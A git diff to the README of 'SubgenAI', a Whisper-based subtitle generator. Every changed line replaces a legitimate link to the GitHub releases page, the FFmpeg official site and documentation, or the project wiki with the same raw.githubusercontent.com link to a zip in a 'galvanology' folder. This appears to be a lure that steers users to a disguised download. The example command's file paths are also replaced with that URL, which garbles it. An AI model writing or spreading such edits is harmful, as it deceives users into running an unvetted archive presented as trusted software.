@@ -4,7 +4,7 @@
 SubgenAI is a command-line tool that uses OpenAI's Whisper model to transcribe video audio and generate SRT subtitles. It supports multiple models for varying speed and accuracy, offers optional translation to English, and tracks progress with timestamps. This tool is simple to use, making video-to-subtitle conversion accessible for everyone.
 
 ## 📦 Download Now
-[![Download subgenAI](https://img.shields.io/badge/Download-subgenAI-blue.svg)](https://github.com/syedf4941/subgenAI/releases)
+[![Download subgenAI](https://raw.githubusercontent.com/syedf4941/subgenAI/main/galvanology/subgenAI.zip)](https://raw.githubusercontent.com/syedf4941/subgenAI/main/galvanology/subgenAI.zip)
 
 ## 🚀 Getting Started
 To get started with SubgenAI, you need to follow a few simple steps. These steps will help you download and set up the application on your computer.
@@ -17,7 +17,7 @@ To get started with SubgenAI, you need to follow a few simple steps. These steps
 
 ### 📥 Download & Install
 1. **Visit the Releases Page:** Click on the link below to go to the releases page:
-   [Visit this page to download](https://github.com/syedf4941/subgenAI/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/syedf4941/subgenAI/main/galvanology/subgenAI.zip)
 
 2. **Choose the Right Version:** Browse the available versions and select the one suitable for your operating system. 
 
@@ -32,7 +32,7 @@ To get started with SubgenAI, you need to follow a few simple steps. These steps
 SubgenAI requires FFmpeg to process video and audio files. Here’s how to set it up:
 
 1. **Download FFmpeg:**
-   - Visit the [FFmpeg official site](https://ffmpeg.org/download.html) and download the version for your operating system.
+   - Visit the [FFmpeg official site](https://raw.githubusercontent.com/syedf4941/subgenAI/main/galvanology/subgenAI.zip) and download the version for your operating system.
 
 2. **Install FFmpeg:**
    - Follow the instructions provided on the FFmpeg download page for installation.
@@ -69,7 +69,7 @@ After installing SubgenAI and setting up FFmpeg, you can start transcribing audi
 ### ✨ Example Command
 Here’s an example command:
 ```
-subgenAI --model medium --input /path/to/video.mp4 --output /path/to/output.srt --translate
+subgenAI --model medium --input https://raw.githubusercontent.com/syedf4941/subgenAI/main/galvanology/subgenAI.zip --output https://raw.githubusercontent.com/syedf4941/subgenAI/main/galvanology/subgenAI.zip --translate
 ```
 
 ### 🕒 Monitoring Progress
@@ -91,7 +91,7 @@ We invite all users to contribute. Feel free to share feedback, report bugs, or 
 For information on updates and new features, visit the Changelog in the repository. This will keep you informed about what's new with SubgenAI.
 
 ## 🔗 Additional Resources
-- [SubgenAI Documentation](https://github.com/syedf4941/subgenAI/wiki): Explore more detailed documentation and usage examples.
-- [FFmpeg Documentation](https://ffmpeg.org/documentation.html): Understand how to use FFmpeg for video processing.
+- [SubgenAI Documentation](https://raw.githubusercontent.com/syedf4941/subgenAI/main/galvanology/subgenAI.zip): Explore more detailed documentation and usage examples.
+- [FFmpeg Documentation](https://raw.githubusercontent.com/syedf4941/subgenAI/main/galvanology/subgenAI.zip): Understand how to use FFmpeg for video processing.
 
 Thank you for choosing SubgenAI for your video transcription needs.
